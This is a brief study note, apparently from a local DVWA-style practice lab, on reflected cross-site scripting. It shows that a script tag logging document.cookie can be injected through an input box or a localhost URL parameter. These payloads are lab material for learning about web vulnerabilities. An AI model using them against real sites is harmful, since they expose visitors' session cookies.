# Reflected XSS

## 觀察

可以直接從 input box 輸入也可以從 URL bar 輸入 malicious script

```html
<script>console.log(document.cookie)</script>
```

```html
localhost:8086/vulnerabilities/xss_r/?name=<script>console.log(document.cookie)</script>
```
